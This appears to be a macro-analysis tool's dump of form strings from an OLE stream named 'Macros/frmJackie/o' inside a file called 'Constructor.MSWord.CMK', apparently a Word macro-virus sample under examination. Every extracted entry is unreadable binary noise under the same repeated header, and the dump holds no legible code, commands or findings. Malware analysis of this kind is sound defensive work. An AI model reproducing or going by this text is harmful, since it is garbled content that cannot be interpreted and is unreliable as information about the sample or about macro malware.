- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ұ�-i�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L��6�|3a3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kv�M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Fzr2@��&�Ú����3K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[��&��;��R��cʞ�{~�z].�M��m*(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��OI���h��Fz�_O�<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1 ��(-�.�ҫ����J�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�6_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%uF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ԗ�5��S/X�0�w:��{��t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��c��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ks��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˦��8�G�o񬥏��,���a��%x�n�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R,��i/��Ŷ6-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2���m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`]�;pI?Ҥ��6�B�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 {��k�k{-/����%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�嚭�jZ��d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�I_	hq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�M�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�2J6�T�0y�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�̖
wnOS�0j宓�]���HQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G���}�7�iom9a�ňF�w�8c�S����m��8�J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�ߊ�X�k�#%�W��Ňö��k��&:�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ʒ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O9�	 w>�R�U�t�h亓R��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�źc t�s����I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�~���y+W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dk�N��/�75/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�鑼6R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˲O��X�_��{q\����ۗ��II9˱5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T#Om_s��iTz�Y�?�)i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�}��I�g���z���I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�>��i�j�������)����ĳ&7$�FG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NJ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S���±\n�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�/e=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Uj�;��՝���D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>���
���{��-b���T\��8���%���ϗ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���kEq�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
��tK}oķ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��nOA*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1V�o.,<Auqm!�T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�5�E&ڋ���7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g%us����5��̎[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
»������{U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��}�G�#֨����3�l��n~nW��ԫ�2e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�T�m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4v:�i$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[`O���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���*��|5g�ɕ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݐ.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������B�sd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m����~U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2zJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�~'Gq�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ne*q�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y4�"��X�t,Kv9�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W<<[o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ғ$�}~�*x��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qZE����,J���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����YY���hp�q��q���ڙ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>��v� {���1Ԛó�ܳ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�T\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&���Qc�%l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b����p>k���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%dͩ�U��]�2��Xܐ��9,3ǿ`=:g׵Aϔ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ӟ�k6�I|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��ʗ�r���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ܞj�ϵ�}B6bF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]qç
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�f��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dw��7Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ǒ�ެj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�Q��ҀZR��g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u����!m�Tb��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~��V���c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&?����s�Ju�(��C�'R^EӨ\C���;�B�ܪzd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ҵ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=�֭4*�7FΫ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8�n/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�Ym��/
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	Ĭ�I�Y�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qwQ�ɘ,D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����|3��l)s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2@'�x��O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1ێ��GㆅJŤڠ>��?���ec��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1��^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������}����vG|�?�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����N�Jֱ����0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� m�Ԝ�\\�+�'�r!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�ps�!?ήXZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/̈�h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7����Ks
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���W�7d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
܀9���C�B7?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v����j�7�J�r���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gj��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������j5)I���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b*¢N1�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Γԙ-[�?�{�l�uJ��Y������Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�تF�֍��왣���3�c�=��|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L+:�l2�^�/c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$5�J?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���=�-��}����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֯��<I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��ηƻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_2�F���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ua�NEzܓ-߇��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N�:�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]}��B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����=?�yY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$f�?����k(w_�GP�󦹙�2��YU�
����r7(�ҳ��e����T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���un�e�Mj�Wq

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[X�gr�t��$Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�rO�ȧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�������$�E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�չ�H$��*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ê�=	��,!�F��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1���~�
�BF�Q�������f����g.��اj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
